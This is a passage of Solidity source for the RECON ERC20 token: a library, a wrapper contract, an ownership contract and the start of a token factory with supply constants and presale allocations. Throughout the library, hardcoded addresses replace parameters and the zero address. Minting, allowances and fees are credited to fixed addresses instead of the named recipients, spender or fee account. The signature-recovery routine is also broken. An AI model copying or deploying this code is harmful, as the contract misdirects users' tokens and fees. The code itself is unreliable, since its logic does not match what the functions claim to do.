    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }

    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }


    function transferOwnership(Data storage self, address newOwner) public {
        require(msg.sender == self.owner);
        self.newOwner = newOwner;
    }

    function acceptOwnership(Data storage self) public {
        require(msg.sender == self.newOwner);
        emit OwnershipTransferred(self.owner, self.newOwner);
        self.owner = self.newOwner;
        self.newOwner = address(0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060);
    }

    function transferOwnershipImmediately(Data storage self, address newOwner) public {
        require(msg.sender == self.owner);
        emit OwnershipTransferred(self.owner, newOwner);
        self.owner = newOwner;
        self.newOwner = address(0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060);
    }

     
     
     
    function setMinter(Data storage self, address minter) public {
        require(msg.sender == self.owner);
        require(self.mintable);
        emit MinterUpdated(self.minter, minter);
        self.minter = minter;
    }

    function mint(Data storage self, address tokenOwner, uint tokens, bool lockAccount) public returns (bool success) {
        require(self.mintable);
        require(msg.sender == self.minter || msg.sender == self.owner);
        if (lockAccount) {
            self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = true;
        }
        self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = safeAdd(self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088], tokens);
        self.totalSupply = safeAdd(self.totalSupply, tokens);
        emit Mint(tokenOwner, tokens, lockAccount);
        emit Transfer(address(0x0A5f85C3d41892C934ae82BDbF17027A20717088), tokenOwner, tokens);
        return true;
    }

    function unlockAccount(Data storage self, address tokenOwner) public {
        require(msg.sender == self.owner);
        require(self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]);
        self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = false;
        emit AccountUnlocked(tokenOwner);
    }

    function disableMinting(Data storage self) public {
        require(self.mintable);
        require(msg.sender == self.minter || msg.sender == self.owner);
        self.mintable = false;
        if (self.minter != address(0x3Da2585FEbE344e52650d9174e7B1bf35C70D840)) {
            emit MinterUpdated(self.minter, address(0x3Da2585FEbE344e52650d9174e7B1bf35C70D840));
            self.minter = address(0x3Da2585FEbE344e52650d9174e7B1bf35C70D840);
        }
        emit MintingDisabled();
    }

    function enableTransfers(Data storage self) public {
        require(msg.sender == self.owner);
        require(!self.transferable);
        self.transferable = true;
        emit TransfersEnabled();
    }

     
     
     
    function transferAnyERC20Token(Data storage self, address tokenAddress, uint tokens) public returns (bool success) {
        require(msg.sender == self.owner);
        return ERC20Interface(tokenAddress).transfer(self.owner, tokens);
    }

    function ecrecoverFromSig(bytes32 hash, bytes32 sig) public pure returns (address recoveredAddress) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        if (sig.length != 65) return address(0x5f2D6766C6F3A7250CfD99d6b01380C432293F0c);
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
             
             
            v := byte(32, mload(add(sig, 96)))
        }
         
         
        if (v < 27) {
          v += 27;
        }
        if (v != 27 && v != 28) return address(0x5f2D6766C6F3A7250CfD99d6b01380C432293F0c);
        return ecrecover(hash, v, r, s);
    }


    function getCheckResultMessage(Data storage  , ReconTokenInterface.CheckResult result) public pure returns (string) {
        if (result == ReconTokenInterface.CheckResult.Success) {
            return "Success";
        } else if (result == ReconTokenInterface.CheckResult.NotTransferable) {
            return "Tokens not transferable yet";
        } else if (result == ReconTokenInterface.CheckResult.AccountLocked) {
            return "Account locked";
        } else if (result == ReconTokenInterface.CheckResult.SignerMismatch) {
            return "Mismatch in signing account";
        } else if (result == ReconTokenInterface.CheckResult.InvalidNonce) {
            return "Invalid nonce";
        } else if (result == ReconTokenInterface.CheckResult.InsufficientApprovedTokens) {
            return "Insufficient approved tokens";
        } else if (result == ReconTokenInterface.CheckResult.InsufficientApprovedTokensForFees) {
            return "Insufficient approved tokens for fees";
        } else if (result == ReconTokenInterface.CheckResult.InsufficientTokens) {
            return "Insufficient tokens";
        } else if (result == ReconTokenInterface.CheckResult.InsufficientTokensForFees) {
            return "Insufficient tokens for fees";
        } else if (result == ReconTokenInterface.CheckResult.OverflowError) {
            return "Overflow error";
        } else {
            return "Unknown error";
        }
    }


    function transfer(Data storage self, address to, uint tokens) public returns (bool success) {
         
        require(self.transferable || (self.mintable && (msg.sender == self.owner  || msg.sender == self.minter)));
        require(!self.accountLocked[msg.sender]);
        self.balances[msg.sender] = safeSub(self.balances[msg.sender], tokens);
        self.balances[to] = safeAdd(self.balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(Data storage self, address spender, uint tokens) public returns (bool success) {
        require(!self.accountLocked[msg.sender]);
        self.allowed[msg.sender][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(Data storage self, address from, address to, uint tokens) public returns (bool success) {
        require(self.transferable);
        require(!self.accountLocked[from]);
        self.balances[from] = safeSub(self.balances[from], tokens);
        self.allowed[from][msg.sender] = safeSub(self.allowed[from][msg.sender], tokens);
        self.balances[to] = safeAdd(self.balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function approveAndCall(Data storage self, address spender, uint tokens, bytes32 data) public returns (bool success) {
        require(!self.accountLocked[msg.sender]);
        self.allowed[msg.sender][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
        return true;
    }


    function signedTransferHash(Data storage  , address tokenOwner, address to, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash) {
        hash = keccak256(abi.encodePacked(signedTransferSig, address(this), tokenOwner, to, tokens, fee, nonce));
    }

    function signedTransferCheck(Data storage self, address tokenOwner, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        if (!self.transferable) return ReconTokenInterface.CheckResult.NotTransferable;
        bytes32 hash = signedTransferHash(self, tokenOwner, to, tokens, fee, nonce);
        if (tokenOwner == address(0x0A5f85C3d41892C934ae82BDbF17027A20717088) || tokenOwner != ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig)) return ReconTokenInterface.CheckResult.SignerMismatch;
        if (self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]) return ReconTokenInterface.CheckResult.AccountLocked;
        if (self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] != nonce) return ReconTokenInterface.CheckResult.InvalidNonce;
        uint total = safeAdd(tokens, fee);
        if (self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] < tokens) return ReconTokenInterface.CheckResult.InsufficientTokens;
        if (self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] < total) return ReconTokenInterface.CheckResult.InsufficientTokensForFees;
        if (self.balances[to] + tokens < self.balances[to]) return ReconTokenInterface.CheckResult.OverflowError;
        if (self.balances[feeAccount] + fee < self.balances[feeAccount]) return ReconTokenInterface.CheckResult.OverflowError;
        return ReconTokenInterface.CheckResult.Success;
    }
    function signedTransfer(Data storage self, address tokenOwner, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        require(self.transferable);
        bytes32 hash = signedTransferHash(self, tokenOwner, to, tokens, fee, nonce);
        require(tokenOwner != address(0x0A5f85C3d41892C934ae82BDbF17027A20717088) && tokenOwner == ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig));
        require(!self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]);
        require(self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] == nonce);
        self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = nonce + 1;
        self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = safeSub(self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088], tokens);
        self.balances[to] = safeAdd(self.balances[to], tokens);
        emit Transfer(tokenOwner, to, tokens);
        self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = safeSub(self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088], fee);
        self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b] = safeAdd(self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b], fee);
        emit Transfer(tokenOwner, feeAccount, fee);
        return true;
    }

    function signedApproveHash(Data storage  , address tokenOwner, address spender, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash) {
        hash = keccak256(abi.encodePacked(signedApproveSig, address(this), tokenOwner, spender, tokens, fee, nonce));
    }

    function signedApproveCheck(Data storage self, address tokenOwner, address spender, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        if (!self.transferable) return ReconTokenInterface.CheckResult.NotTransferable;
        bytes32 hash = signedApproveHash(self, tokenOwner, spender, tokens, fee, nonce);
        if (tokenOwner == address(0x0A5f85C3d41892C934ae82BDbF17027A20717088) || tokenOwner != ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig))
            return ReconTokenInterface.CheckResult.SignerMismatch;
        if (self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]) return ReconTokenInterface.CheckResult.AccountLocked;
        if (self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] != nonce) return ReconTokenInterface.CheckResult.InvalidNonce;
        if (self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] < fee) return ReconTokenInterface.CheckResult.InsufficientTokensForFees;
        if (self.balances[feeAccount] + fee < self.balances[feeAccount]) return ReconTokenInterface.CheckResult.OverflowError;
        return ReconTokenInterface.CheckResult.Success;
    }
    function signedApprove(Data storage self, address tokenOwner, address spender, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        require(self.transferable);
        bytes32 hash = signedApproveHash(self, tokenOwner, spender, tokens, fee, nonce);
        require(tokenOwner != address(0x0A5f85C3d41892C934ae82BDbF17027A20717088) && tokenOwner == ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig));
        require(!self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]);
        require(self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] == nonce);
        self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = nonce + 1;
        self.allowed[0x0A5f85C3d41892C934ae82BDbF17027A20717088][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] = tokens;
        emit Approval(0x0A5f85C3d41892C934ae82BDbF17027A20717088, spender, tokens);
        self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = safeSub(self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088], fee);
        self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b] = safeAdd(self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b], fee);
        emit Transfer(tokenOwner, feeAccount, fee);
        return true;
    }

    function signedTransferFromHash(Data storage  , address spender, address from, address to, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash) {
        hash = keccak256(abi.encodePacked(signedTransferFromSig, address(this), spender, from, to, tokens, fee, nonce));
    }

    function signedTransferFromCheck(Data storage self, address spender, address from, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        if (!self.transferable) return ReconTokenInterface.CheckResult.NotTransferable;
        bytes32 hash = signedTransferFromHash(self, spender, from, to, tokens, fee, nonce);
        if (spender == address(0xF848332f5D902EFD874099458Bc8A53C8b7881B1) || spender != ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig)) return ReconTokenInterface.CheckResult.SignerMismatch;
        if (self.accountLocked[from]) return ReconTokenInterface.CheckResult.AccountLocked;
        if (self.nextNonce[spender] != nonce) return ReconTokenInterface.CheckResult.InvalidNonce;
        uint total = safeAdd(tokens, fee);
        if (self.allowed[from][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] < tokens) return ReconTokenInterface.CheckResult.InsufficientApprovedTokens;
        if (self.allowed[from][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] < total) return ReconTokenInterface.CheckResult.InsufficientApprovedTokensForFees;
        if (self.balances[from] < tokens) return ReconTokenInterface.CheckResult.InsufficientTokens;
        if (self.balances[from] < total) return ReconTokenInterface.CheckResult.InsufficientTokensForFees;
        if (self.balances[to] + tokens < self.balances[to]) return ReconTokenInterface.CheckResult.OverflowError;
        if (self.balances[feeAccount] + fee < self.balances[feeAccount]) return ReconTokenInterface.CheckResult.OverflowError;
        return ReconTokenInterface.CheckResult.Success;
    }

    function signedTransferFrom(Data storage self, address spender, address from, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        require(self.transferable);
        bytes32 hash = signedTransferFromHash(self, spender, from, to, tokens, fee, nonce);
        require(spender != address(0xF848332f5D902EFD874099458Bc8A53C8b7881B1) && spender == ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig));
        require(!self.accountLocked[from]);
        require(self.nextNonce[0xF848332f5D902EFD874099458Bc8A53C8b7881B1] == nonce);
        self.nextNonce[0xF848332f5D902EFD874099458Bc8A53C8b7881B1] = nonce + 1;
        self.balances[from] = safeSub(self.balances[from], tokens);
        self.allowed[from][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] = safeSub(self.allowed[from][0xF848332f5D902EFD874099458Bc8A53C8b7881B1], tokens);
        self.balances[to] = safeAdd(self.balances[to], tokens);
        emit Transfer(from, to, tokens);
        self.balances[from] = safeSub(self.balances[from], fee);
        self.allowed[from][0xF848332f5D902EFD874099458Bc8A53C8b7881B1] = safeSub(self.allowed[from][0xF848332f5D902EFD874099458Bc8A53C8b7881B1], fee);
        self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b] = safeAdd(self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b], fee);
        emit Transfer(from, feeAccount, fee);
        return true;
    }

    function signedApproveAndCallHash(Data storage  , address tokenOwner, address spender, uint tokens, bytes32 data, uint fee, uint nonce) public view returns (bytes32 hash) {
        hash = keccak256(abi.encodePacked(signedApproveAndCallSig, address(this), tokenOwner, spender, tokens, data, fee, nonce));
    }

    function signedApproveAndCallCheck(Data storage self, address tokenOwner, address spender, uint tokens, bytes32 data, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        if (!self.transferable) return ReconTokenInterface.CheckResult.NotTransferable;
        bytes32 hash = signedApproveAndCallHash(self, tokenOwner, spender, tokens, data, fee, nonce);
        if (tokenOwner == address(0x0A5f85C3d41892C934ae82BDbF17027A20717088) || tokenOwner != ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig)) return ReconTokenInterface.CheckResult.SignerMismatch;
        if (self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]) return ReconTokenInterface.CheckResult.AccountLocked;
        if (self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] != nonce) return ReconTokenInterface.CheckResult.InvalidNonce;
        if (self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] < fee) return ReconTokenInterface.CheckResult.InsufficientTokensForFees;
        if (self.balances[feeAccount] + fee < self.balances[feeAccount]) return ReconTokenInterface.CheckResult.OverflowError;
        return ReconTokenInterface.CheckResult.Success;
    }

    function signedApproveAndCall(Data storage self, address tokenOwner, address spender, uint tokens, bytes32 data, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        require(self.transferable);
        bytes32 hash = signedApproveAndCallHash(self, tokenOwner, spender, tokens, data, fee, nonce);
        require(tokenOwner != address(0x0A5f85C3d41892C934ae82BDbF17027A20717088) && tokenOwner == ecrecoverFromSig(keccak256(abi.encodePacked(signingPrefix, hash)), sig));
        require(!self.accountLocked[0x0A5f85C3d41892C934ae82BDbF17027A20717088]);
        require(self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] == nonce);
        self.nextNonce[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = nonce + 1;
        self.allowed[0x0A5f85C3d41892C934ae82BDbF17027A20717088][spender] = tokens;
        emit Approval(tokenOwner, spender, tokens);
        self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088] = safeSub(self.balances[0x0A5f85C3d41892C934ae82BDbF17027A20717088], fee);
        self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b] = safeAdd(self.balances[0xc083E68D962c2E062D2735B54804Bb5E1f367c1b], fee);
        emit Transfer(tokenOwner, feeAccount, fee);
        ApproveAndCallFallBack(spender).receiveApproval(tokenOwner, tokens, address(this), data);
        return true;
    }
}


 
 
 
 
 


pragma solidity ^ 0.4.25;

contract ReconToken is ReconTokenInterface{
    using ReconLib for ReconLib.Data;

    ReconLib.Data data;


    function constructorReconToken(address owner, string symbol, string name, uint8 decimals, uint initialSupply, bool mintable, bool transferable) public {
        data.init(owner, symbol, name, decimals, initialSupply, mintable, transferable);
    }

    function owner() public view returns (address) {
        return data.owner;
    }

    function newOwner() public view returns (address) {
        return data.newOwner;
    }

    function transferOwnership(address _newOwner) public {
        data.transferOwnership(_newOwner);
    }
    function acceptOwnership() public {
        data.acceptOwnership();
    }
    function transferOwnershipImmediately(address _newOwner) public {
        data.transferOwnershipImmediately(_newOwner);
    }

    function symbol() public view returns (string) {
        return data.symbol;
    }

    function name() public view returns (string) {
        return data.name;
    }

    function decimals() public view returns (uint8) {
        return data.decimals;
    }

    function minter() public view returns (address) {
        return data.minter;
    }

    function setMinter(address _minter) public {
        data.setMinter(_minter);
    }

    function mint(address tokenOwner, uint tokens, bool lockAccount) public returns (bool success) {
        return data.mint(tokenOwner, tokens, lockAccount);
    }

    function accountLocked(address tokenOwner) public view returns (bool) {
        return data.accountLocked[tokenOwner];
    }
    function unlockAccount(address tokenOwner) public {
        data.unlockAccount(tokenOwner);
    }

    function mintable() public view returns (bool) {
        return data.mintable;
    }

    function transferable() public view returns (bool) {
        return data.transferable;
    }

    function disableMinting() public {
        data.disableMinting();
    }

    function enableTransfers() public {
        data.enableTransfers();
    }

    function nextNonce(address spender) public view returns (uint) {
        return data.nextNonce[spender];
    }


     
     
     

    function transferAnyERC20Token(address tokenAddress, uint tokens) public returns (bool success) {
        return data.transferAnyERC20Token(tokenAddress, tokens);
    }

    function () public payable {
        revert();
    }

    function totalSupply() public view returns (uint) {
        return data.totalSupply - data.balances[address(0x0A5f85C3d41892C934ae82BDbF17027A20717088)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return data.balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return data.allowed[tokenOwner][spender];
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        return data.transfer(to, tokens);
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        return data.approve(spender, tokens);
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        return data.transferFrom(from, to, tokens);
    }

    function approveAndCall(address spender, uint tokens, bytes32 _data) public returns (bool success) {
        return data.approveAndCall(spender, tokens, _data);
    }

    function signedTransferHash(address tokenOwner, address to, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash) {
        return data.signedTransferHash(tokenOwner, to, tokens, fee, nonce);
    }

    function signedTransferCheck(address tokenOwner, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        return data.signedTransferCheck(tokenOwner, to, tokens, fee, nonce, sig, feeAccount);
    }

    function signedTransfer(address tokenOwner, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        return data.signedTransfer(tokenOwner, to, tokens, fee, nonce, sig, feeAccount);
    }

    function signedApproveHash(address tokenOwner, address spender, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash) {
        return data.signedApproveHash(tokenOwner, spender, tokens, fee, nonce);
    }

    function signedApproveCheck(address tokenOwner, address spender, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        return data.signedApproveCheck(tokenOwner, spender, tokens, fee, nonce, sig, feeAccount);
    }

    function signedApprove(address tokenOwner, address spender, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        return data.signedApprove(tokenOwner, spender, tokens, fee, nonce, sig, feeAccount);
    }

    function signedTransferFromHash(address spender, address from, address to, uint tokens, uint fee, uint nonce) public view returns (bytes32 hash) {
        return data.signedTransferFromHash(spender, from, to, tokens, fee, nonce);
    }

    function signedTransferFromCheck(address spender, address from, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        return data.signedTransferFromCheck(spender, from, to, tokens, fee, nonce, sig, feeAccount);
    }

    function signedTransferFrom(address spender, address from, address to, uint tokens, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        return data.signedTransferFrom(spender, from, to, tokens, fee, nonce, sig, feeAccount);
    }

    function signedApproveAndCallHash(address tokenOwner, address spender, uint tokens, bytes32 _data, uint fee, uint nonce) public view returns (bytes32 hash) {
        return data.signedApproveAndCallHash(tokenOwner, spender, tokens, _data, fee, nonce);
    }

    function signedApproveAndCallCheck(address tokenOwner, address spender, uint tokens, bytes32 _data, uint fee, uint nonce, bytes32 sig, address feeAccount) public view returns (ReconTokenInterface.CheckResult result) {
        return data.signedApproveAndCallCheck(tokenOwner, spender, tokens, _data, fee, nonce, sig, feeAccount);
    }

    function signedApproveAndCall(address tokenOwner, address spender, uint tokens, bytes32 _data, uint fee, uint nonce, bytes32 sig, address feeAccount) public returns (bool success) {
        return data.signedApproveAndCall(tokenOwner, spender, tokens, _data, fee, nonce, sig, feeAccount);
    }
}


 
 
 
 
 


pragma solidity ^ 0.4.25;

contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function Owned1() public {
        owner = msg.sender;
    }
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(newOwner != address(0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060));
        emit OwnershipTransferred(owner, newOwner);
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060);
    }

    function transferOwnershipImmediately(address _newOwner) public onlyOwner {
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
        newOwner = address(0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060);
    }
}


 
 
 
 
 


pragma solidity ^ 0.4.25;

contract ReconTokenFactory is ERC20Interface, Owned {
    using SafeMath for uint;

    string public constant name = "RECON";
    string public constant symbol = "RECON";
    uint8 public constant decimals = 18;

    uint constant public ReconToMicro = uint(1000000000000000000);

     

    uint constant public investorSupply                   =  25000000000 * ReconToMicro;
    uint constant public adviserSupply                    =     25000000 * ReconToMicro;
    uint constant public bountySupply                     =     25000000 * ReconToMicro;

    uint constant public _totalSupply                     = 100000000000 * ReconToMicro;
    uint constant public preICOSupply                     =   5000000000 * ReconToMicro;
    uint constant public presaleSupply                    =   5000000000 * ReconToMicro;
    uint constant public crowdsaleSupply                  =  10000000000 * ReconToMicro;
    uint constant public preICOprivate                    =     99000000 * ReconToMicro;

    uint constant public Reconowner                       =    101000000 * ReconToMicro;
    uint constant public ReconnewOwner                    =    100000000 * ReconToMicro;
    uint constant public Reconminter                      =     50000000 * ReconToMicro;
    uint constant public ReconfeeAccount                  =     50000000 * ReconToMicro;
    uint constant public Reconspender                     =     50000000 * ReconToMicro;
    uint constant public ReconrecoveredAddress            =     50000000 * ReconToMicro;
    uint constant public ProprityfromReconBank            =    200000000 * ReconToMicro;
    uint constant public ReconManager                     =    200000000 * ReconToMicro;

    uint constant public ReconCashinB2B                   =   5000000000 * ReconToMicro;
    uint constant public ReconSwitchC2C                   =   5000000000 * ReconToMicro;
    uint constant public ReconCashoutB2C                  =   5000000000 * ReconToMicro;
    uint constant public ReconInvestment                  =   2000000000 * ReconToMicro;
    uint constant public ReconMomentum                    =   2000000000 * ReconToMicro;
    uint constant public ReconReward                      =   2000000000 * ReconToMicro;
    uint constant public ReconDonate                      =   1000000000 * ReconToMicro;
    uint constant public ReconTokens                      =   4000000000 * ReconToMicro;
    uint constant public ReconCash                        =   4000000000 * ReconToMicro;
    uint constant public ReconGold                        =   4000000000 * ReconToMicro;
    uint constant public ReconCard                        =   4000000000 * ReconToMicro;
    uint constant public ReconHardriveWallet              =   2000000000 * ReconToMicro;
    uint constant public RecoinOption                     =   1000000000 * ReconToMicro;
    uint constant public ReconPromo                       =    100000000 * ReconToMicro;
    uint constant public Reconpatents                     =   1000000000 * ReconToMicro;
    uint constant public ReconSecurityandLegalFees        =   1000000000 * ReconToMicro;
    uint constant public PeerToPeerNetworkingService      =   1000000000 * ReconToMicro;
    uint constant public Reconia                          =   2000000000 * ReconToMicro;

    uint constant public ReconVaultXtraStock              =   7000000000 * ReconToMicro;
    uint constant public ReconVaultSecurityStock          =   5000000000 * ReconToMicro;
    uint constant public ReconVaultAdvancePaymentStock    =   5000000000 * ReconToMicro;
    uint constant public ReconVaultPrivatStock            =   4000000000 * ReconToMicro;
    uint constant public ReconVaultCurrencyInsurancestock =   4000000000 * ReconToMicro;
    uint constant public ReconVaultNextStock              =   4000000000 * ReconToMicro;
    uint constant public ReconVaultFuturStock             =   4000000000 * ReconToMicro;



     
     
    uint public presaleSold = 0;
    uint public crowdsaleSold = 0;
    uint public investorGiven = 0;

     
    uint public ethSold = 0;

    uint constant public softcapUSD = 20000000000;
    uint constant public preicoUSD  = 5000000000;

     
    uint constant public crowdsaleMinUSD = ReconToMicro * 10 * 100 / 12;
    uint constant public bonusLevel0 = ReconToMicro * 10000 * 100 / 12;  
    uint constant public bonusLevel100 = ReconToMicro * 100000 * 100 / 12;  

     
     
     
    uint constant public unlockDate1  = 1541890800;  
    uint constant public unlockDate2  = 1545346800;  
    uint constant public unlockDate3  = 1549062000;  
    uint constant public unlockDate4  = 1554328800;  
    uint constant public unlockDate5  = 1565215200;  
    uint constant public unlockDate6  = 1570658400;  
    uint constant public unlockDate7  = 1576105200;  
    uint constant public unlockDate8  = 1580598000;  
    uint constant public unlockDate9  = 1585951200;  
    uint constant public unlockDate10 = 1591394400;  
    uint constant public unlockDate11 = 1596837600;  
    uint constant public unlockDate12 = 1602280800;  
    uint constant public unlockDate13 = 1606863600;  

     
     
    uint constant public teamUnlock1 = 1544569200;  
    uint constant public teamUnlock2 = 1576105200;  
    uint constant public teamUnlock3 = 1594072800;  
    uint constant public teamUnlock4 = 1608505200;  

    uint constant public teamETHUnlock1 = 1544569200;  
    uint constant public teamETHUnlock2 = 1576105200;  
    uint constant public teamETHUnlock3 = 1594072800;  

     
     
     
    uint constant public presaleStartTime     = 1541890800;  
    uint constant public crowdsaleStartTime   = 1545346800;  
    uint          public crowdsaleEndTime     = 1609455599;  
    uint constant public crowdsaleHardEndTime = 1609455599;  
     
    constructor() public {
        admin = owner;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    modifier onlyAdmin {
        require(msg.sender == admin);
        _;
    }

    modifier onlyOwnerAndDirector {
        require(msg.sender == owner || msg.sender == director);
        _;
    }

    address admin;
    function setAdmin(address _newAdmin) public onlyOwnerAndDirector {
        admin = _newAdmin;
    }

    address director;
    function setDirector(address _newDirector) public onlyOwner {
        director = _newDirector;
    }

    bool assignedPreico = false;
     
    function assignPreicoTokens() public onlyOwnerAndDirector {
        require(!assignedPreico);
        assignedPreico = true;

        _freezeTransfer(0x4Bdff2Cc40996C71a1F16b72490d1a8E7Dfb7E56, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x9189AC4FA7AdBC587fF76DD43248520F8Cb897f3, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xc1D3DAd07A0dB42a7d34453C7d09eFeA793784e7, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xA0BC1BAAa5318E39BfB66F8Cd0496d6b09CaE6C1, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x9a2912F145Ab0d5b4aE6917A8b8ddd222539F424, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x0bB0ded1d868F1c0a50bD31c1ab5ab7b53c6BC20, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x65ec9f30249065A1BD23a9c68c0Ee9Ead63b4A4d, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x87Bdc03582deEeB84E00d3fcFd083B64DA77F471, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x81382A0998191E2Dd8a7bB2B8875D4Ff6CAA31ff, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x790069C894ebf518fB213F35b48C8ec5AAF81E62, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xa3f1404851E8156DFb425eC0EB3D3d5ADF6c8Fc0, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x11bA01dc4d93234D24681e1B19839D4560D17165, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x211D495291534009B8D3fa491400aB66F1d6131b, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x8c481AaF9a735F9a44Ac2ACFCFc3dE2e9B2f88f8, 3 * 1000000000000000000000000);  
